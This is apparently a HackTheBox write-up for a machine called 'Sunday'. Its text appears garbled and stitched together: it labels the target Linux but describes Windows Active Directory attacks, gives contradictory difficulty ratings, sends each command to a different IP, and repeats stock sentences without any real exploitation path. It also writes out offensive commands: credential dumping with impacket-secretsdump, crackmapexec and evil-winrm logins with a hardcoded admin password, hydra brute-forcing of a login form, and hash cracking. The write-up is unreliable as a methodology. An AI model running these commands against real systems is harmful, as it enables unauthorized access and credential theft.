---
TitleSEO: "HackTheBox — Sunday (Medium Linux) | ZureFX"
TitlePost: "HackTheBox — Sunday (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Sunday. Kerberoasting and Pass the Ticket to achieve medium compromise on Linux."
Keywords: "windows, easy, reversing, pwntilldawn, web"
URL: "https://zurefx.github.io/writeups/htb-sunday-351.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sunday-351/"
Date: "2024-05-11"
Tags: "Windows, Easy, Reversing, PwnTillDawn, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-sunday-351"
Permalink: "/writeups/htb-sunday-351.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Sunday** is rated **Medium** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.14.144.157`.

### Objectives

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.81.114.174/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.64.86.8
```

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

### Web Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.27.239.123 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.22.222.49 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

Key finding: **Pass the Ticket**.

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.72.134.40 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.104.31 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
crackmapexec smb 10.124.78.91 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.58.232.41 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `ligolo-ng`
- `rubeus`
- `smbexec`
- `GetNPUsers`
- `GetUserSPNs`

### Key Takeaways

- Kerberoasting
- Pass the Ticket
- Remote Code Execution
- Open Redirect
